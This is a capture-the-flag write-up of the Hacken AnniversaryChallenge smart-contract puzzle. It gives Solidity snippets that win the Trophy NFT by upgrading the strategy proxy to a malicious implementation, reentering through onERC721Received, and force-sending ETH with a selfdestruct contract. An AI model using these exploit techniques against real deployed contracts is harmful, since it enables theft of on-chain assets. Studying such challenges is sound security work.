
# Hacken AnniversaryChallenge CTF Write-Up

## Overview

I had a very fun time doing this CTF but unfortunately due to time constraints and other private audit bookings I couldn't apply for the Position before the deadline

This CTF challenge from Hacken revolves around exploiting the `AnniversaryChallenge` contract to claim the Trophy NFT (Token ID: 1). The constraints are:
- Executing the exploit in a single transaction.
- No modifications to the `setUp()` function.
- Avoiding the use of `deal()` or `vm.deal()`.

The exploit utilizes the upgradeable strategy pattern in the contract to inject malicious behavior, enabling bypassing of validations and securing the Trophy NFT.

---

## Target Contract: AnniversaryChallenge

The `AnniversaryChallenge` contract employs an upgradeable strategy via the ERC1967 proxy pattern. Key features include:

1. **Upgradeable Strategy:**
   - The `upgradeTo(address newImplementation)` function enables the owner to dynamically modify the logic of the `SimpleStrategy` contract.

2. **Trophy NFT Claiming:**
   - The `claimTrophy(address receiver, uint256 value)` function allows claiming the Trophy NFT. Key checks include:
     - Ensuring the receiver implements the `IERC721Receiver` interface.
     - Validating that the NFT can be minted or transferred without errors.

3. **Catch Block Handling:**
   - If certain conditions fail during `claimTrophy`, error-handling logic is triggered, potentially transferring the Trophy NFT under specific conditions.

---

## Exploit Strategy

### Observations
1. **Upgradeable Strategy Vulnerability:**
   - The `upgradeTo()` function allows introducing malicious behavior into `SimpleStrategy` to exploit internal logic.

2. **Key Conditions in `claimTrophy`:**
   - `msg.sender` must be an externally owned account (EOA).
   - The contract balance must be zero.
   - The `usdcAddress()` in `SimpleStrategy` must match the actual USDC contract.
   
```solidity
       require(msg.sender.code.length == 0, "No contractcs.");
        require(address(this).balance == 0, "No treasury.");
        require(simpleStrategy.usdcAddress() == 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, "Only real USDC.");
```

3. **Catch Block Execution:**
   - If `externalSafeApprove` or `deployFunds` fails, the contract:
     - Transfers the Trophy NFT to the receiver.
     - Ensures the contract’s balance increases (`require(address(this).balance > 0 wei)`).

---

## Exploit Flow

1. **Deploy Malicious Strategy:**
   - Deploy a `MaliciousStrategy` to override `SimpleStrategy`, deliberately causing `deployFunds` to revert:
     ```solidity
     function _upgradeSimplyStorage() private {
         MaliciousSimpleStrategy maliciousSimpleStrategy = new MaliciousSimpleStrategy();
         challenge.simpleStrategy().upgradeTo(address(maliciousSimpleStrategy));
     }
     ```

2. **Trigger Trophy NFT Transfer:**
   - Call `claimTrophy` with the receiver set to a malicious contract:
     ```solidity
     function _executeCall() private {
         challenge.claimTrophy(address(nftReceiver), 1 wei);
         challenge.claimTrophy(address(nftReceiver), 1 wei);
     }
     ```

3. **Re-enter with `onERC721Received`:**
   - Use `onERC721Received` to manipulate state by forcefully sending ETH to the `AnniversaryChallenge`:
     ```solidity
     function onERC721Received(
         address operator,
         address from,
         uint256 tokenId,
         bytes calldata data
     ) external returns (bytes4) {
         new Force{value: 1}(from);
         ERC721(msg.sender).safeTransferFrom(address(this), owner, tokenId);
         return IERC721Receiver.onERC721Received.selector;
     }
     ```

4. **Force ETH to the Contract:**
   - Deploy `Force.sol` to send ETH forcefully:
     ```solidity
     constructor(address _beneficiary) payable {
         selfdestruct(payable(_beneficiary));
     }
     ```

5. **Bypass Final Check:**
   - The forced ETH transfer passes the `require(address(this).balance > 0 wei)` check, securing the Trophy NFT.

---

## Steps to Run the Exploit

### Prerequisites:
- A local Ethereum development environment (e.g., Hardhat or Foundry).
- Installed dependencies with the package manager.
- Ensure the test suite and `AnniversaryChallenge` contract are deployed correctly.

### Execution:
1. Fork the Ethereum mainnet at the specified block:
   ```bash
   forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/<YOUR_ALCHEMY_KEY> --fork-block-number 20486120
   ```

